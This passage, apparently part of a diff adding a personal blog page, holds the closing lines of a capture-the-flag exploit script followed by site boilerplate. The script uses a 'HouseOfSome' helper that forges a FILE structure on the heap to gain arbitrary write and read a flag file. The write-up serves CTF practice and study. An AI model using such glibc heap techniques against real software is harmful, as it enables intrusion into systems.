+fake_file_start = chunk4_head + 0x200
+hos = HouseOfSome(libc=libc, controled_addr=fake_file_start) #传参
+# 构造第一个任意地址写原语
+payload = hos.hoi_read_file_template(fake_file_start, 0x400, fake_file_start, 0) #指向并写入fake_file_start
+edit(4,payload[16:])
+exit()
+#hos.bomb(p)
+hos.bomb_orw(p,&#34;./flag&#34;)
+</code></pre></article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/toc.js'></script>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/toc.css' />
+
+  
+<div id="gitalk-container" class="gitalk-container"></div>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/gitalk.css'>
+<script src='https://ret2ldz.github.io/js/gitalk.min.js'></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: 'Your client ID',
+    clientSecret: 'Your client secret',
+    repo: 'ret2ldz.github.io',
+    owner: 'ventusoon',
+    admin: ['ventusoon'],
+    id: eval("location.pathname"), 
+    distractionFreeMode: false 
+  });
+  (function() {
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+</div>
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://ret2ldz.github.io/">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
+      
+      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+
+</body>
+
+<script type="application/javascript" src="https://ret2ldz.github.io/js/github-style.js"></script>
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.min.js"></script>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/search.js'></script>
+
+
+
+</html>
